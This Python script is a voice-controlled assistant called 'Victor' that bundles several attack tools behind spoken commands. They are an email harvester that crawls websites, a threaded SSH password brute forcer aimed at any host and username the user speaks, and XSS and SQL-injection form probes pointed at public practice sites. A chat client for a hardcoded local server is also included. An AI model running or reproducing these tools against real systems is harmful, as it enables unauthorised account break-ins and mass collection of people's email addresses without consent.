import pyttsx3
import datetime
import speech_recognition as sr
import wikipedia
import time
import socket
import threading
from queue import Queue
from colored import fore, back, style
from bs4 import BeautifulSoup
import requests.exceptions
import urllib.parse
from collections import deque
import re
import paramiko, sys, os, termcolor
import threading, time
from IPy import IP
import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


engine =pyttsx3.init('sapi5')
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[0].id)

def speak(audio):
    engine.say(audio)
    engine.runAndWait()

def wishme():
    hour=int(datetime.datetime.now().hour)
    if hour >= 0 and hour<12:
        speak("Good Morning sir!")
    elif hour >=12 and hour<18:
        speak("Good Afternoon sir!")
    else:
        speak("Good evening sir!")
    speak("I am Victor.")

def takecommand():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening...")
        r.pause_threshold = 1
        audio = r.listen(source)

        try:
            print("Recognizing...")
            query = r.recognize_google(audio, language='en-in')
            print(f"user said: {query}\n")
        except Exception as e:
            print("Say that again..")
            return "None"
        return query
        
def chatroom():
    nickname = 'victor'
    nickname = input("Choose your nickname: ")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.49.129', 1122))
    def receive():
        while True:
            try:
                message = client.recv(1024).decode('ascii')
                if message == 'NICK':
                    client.send(nickname.encode('ascii'))
                else:
                    print(fore.LIGHT_BLUE + back.RED + style.BOLD + "--#~" + message +  style.RESET)
            except:
                print("An error occured!")
                client.close()
                break
    def write():
        while True:
            message = '{}: {}'.format(nickname, input(''))
            client.send(message.encode('ascii'))
    receive_thread = threading.Thread(target=receive)
    receive_thread.start()

    write_thread = threading.Thread(target=write)
    write_thread.start()

if __name__ == "__main__":
    wishme()
    while True:
        query = takecommand().lower()

        if 'wikipedia' in query:
            speak('Let me search it..')
            query = query.replace("wikipedia","")
            results = wikipedia.summary(query, sentences=2)
            speak("According to wikipedia")
            print(results)
            speak(results)

        elif 'your capabilities'in query:
            speak("I can find ip of any domain, scrap emails, bruteforce ssh connection, scan port and grab banners and specificically find vulnerabilities")

        elif 'my ip' in query:
            hostname = socket.gethostname()
            print("YOUR IP IS " + socket.gethostbyname(hostname))
            speak("Your ip is" + socket.gethostbyname(hostname))


        elif 'what is the ip' in query:
            data = query.split()
            for temp in data:
                if '.' in temp:
                    url=temp
            ip = socket.gethostbyname(url)
            print("THE IP FOR " + url + " IS "+ip)
            speak("The ip for " + url + "is "+ip)

        elif 'scrap email' in query:
            data = query.split()
            for temp in data:
                if '.' in temp:
                    user_url=temp
            urls = deque([user_url])

            scraped_urls = set()
            emails = set()

            count = 0
            try:
                while len(urls):
                    count += 1
                    if count == 100:
                        break
                    url = urls.popleft()
                    scraped_urls.add(url)

                    parts = urllib.parse.urlsplit(url)
                    base_url = '{0.scheme}://{0.netloc}'.format(parts)

                    path = url[:url.rfind('/')+1] if '/' in parts.path else url

                    print('[%d] Processing %s' % (count, url))
                    try:
                        response = requests.get(url)
                    except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                        continue

                    new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
                    emails.update(new_emails)

                    soup = BeautifulSoup(response.text, features="lxml")

                    for anchor in soup.find_all("a"):
                        link = anchor.attrs['href'] if 'href' in anchor.attrs else ''
                        if link.startswith('/'):
                            link = base_url + link
                        elif not link.startswith('http'):
                            link = path + link
                        if not link in urls and not link in scraped_urls:
                            urls.append(link)
            except KeyboardInterrupt:
                print('[-] Closing!')

            for mail in emails:
                print(mail)

        elif 'ssh brute force' in query:
            stop_flag = 0

            def ssh_connect(password):
                global stop_flag
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(host, port=22, username=username, password=password)
                    stop_flag = 1
                    print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
                except:
                    print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
                ssh.close()
            speak("specify the host")
            host = takecommand()
            speak("specify the username")
            username = takecommand()
            
            print('\n')

            speak('Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username)
            print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')

            passwords = 'passwords.txt'
            with open(passwords, 'r') as file:
                for line in file.readlines():
                    if stop_flag == 1:
                        t.join()
                        exit()
                    password = line.strip()
                    t = threading.Thread(target=ssh_connect, args=(password,))
                    t.start()
                    time.sleep(0.5)

        elif 'xss' in query:
            def get_all_forms(url):
                soup = bs(requests.get(url).content, "html.parser")
                return soup.find_all("form")

            def get_form_details(form):
                details = {}
                action = form.attrs.get("action").lower()
                method = form.attrs.get("method", "get").lower()
                inputs = []
                for input_tag in form.find_all("input"):
                    input_type = input_tag.attrs.get("type", "text")
                    input_name = input_tag.attrs.get("name")
                    inputs.append({"type": input_type, "name": input_name})
                details["action"] = action
                details["method"] = method
                details["inputs"] = inputs
                return details


            def submit_form(form_details, url, value):
                target_url = urljoin(url, form_details["action"])
                inputs = form_details["inputs"]
                data = {}
                for input in inputs:
                    if input["type"] == "text" or input["type"] == "search":
                        input["value"] = value
                    input_name = input.get("name")
                    input_value = input.get("value")
                    if input_name and input_value:
                        data[input_name] = input_value

                if form_details["method"] == "post":
                    return requests.post(target_url, data=data)
                else:
                    return requests.get(target_url, params=data)


            def scan_xss(url):
                forms = get_all_forms(url)
                print(f"[+] Detected {len(forms)} forms on {url}.")
                js_script = "<Script>alert('hi')</scripT>"
                is_vulnerable = False
                for form in forms:
                    form_details = get_form_details(form)
                    content = submit_form(form_details, url, js_script).content.decode()
                    if js_script in content:
                        print(f"[+] XSS Detected on {url}")
                        print(f"[*] Form details:")
                        pprint(form_details)
                        is_vulnerable = True
                return is_vulnerable

            if __name__ == "__main__":
                url = "https://xss-game.appspot.com/level1/frame"
                print(scan_xss(url))

        elif 'sql' in query:
            s = requests.Session()
            s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

            def get_all_forms(url):
                """Given a `url`, it returns all forms from the HTML content"""
                soup = bs(s.get(url).content, "html.parser")
                return soup.find_all("form")

            def get_form_details(form):
                """
                This function extracts all possible useful information about an HTML `form`
                """
                details = {}
                try:
                    action = form.attrs.get("action").lower()
                except:
                    action = None
                method = form.attrs.get("method", "get").lower()
                inputs = []
                for input_tag in form.find_all("input"):
                    input_type = input_tag.attrs.get("type", "text")
                    input_name = input_tag.attrs.get("name")
                    input_value = input_tag.attrs.get("value", "")
                    inputs.append({"type": input_type, "name": input_name, "value": input_value})
                details["action"] = action
                details["method"] = method
                details["inputs"] = inputs
                return details

            def is_vulnerable(response):
                """A simple boolean function that determines whether a page 
                is SQL Injection vulnerable from its `response`"""
                errors = {
                    "you have an error in your sql syntax;",
                    "warning: mysql",
                    "unclosed quotation mark after the character string",
                    "quoted string not properly terminated",
                }
                for error in errors:
                    if error in response.content.decode().lower():
                        return True
                return False


            def scan_sql_injection(url):
                for c in "\"'":
                    new_url = f"{url}{c}"
                    print("[!] Trying", new_url)
                    res = s.get(new_url)
                    if is_vulnerable(res):
                        print("[+] SQL Injection vulnerability detected, link:", new_url)
                        return
                forms = get_all_forms(url)
                print(f"[+] Detected {len(forms)} forms on {url}.")
                for form in forms:
                    form_details = get_form_details(form)
                    for c in "\"'":
                        data = {}
                        for input_tag in form_details["inputs"]:
                            if input_tag["value"] or input_tag["type"] == "hidden":
                                try:
                                    data[input_tag["name"]] = input_tag["value"] + c
                                except:
                                    pass
                            elif input_tag["type"] != "submit":
                                data[input_tag["name"]] = f"test{c}"
                        url = urljoin(url, form_details["action"])
                        if form_details["method"] == "post":
                            res = s.post(url, data=data)
                        elif form_details["method"] == "get":
                            res = s.get(url, params=data)
                        if is_vulnerable(res):
                            print("[+] SQL Injection vulnerability detected, link:", url)
                            print("[+] Form:")
                            pprint(form_details)
                            break   

            if __name__ == "__main__":
                import sys
                url = "http://testphp.vulnweb.com/artists.php?artist=1" 
                scan_sql_injection(url)

        elif 'Enter chat room' in query:
            chatroom()
            quit()
       
        else:
            speak("I didn't understand you")



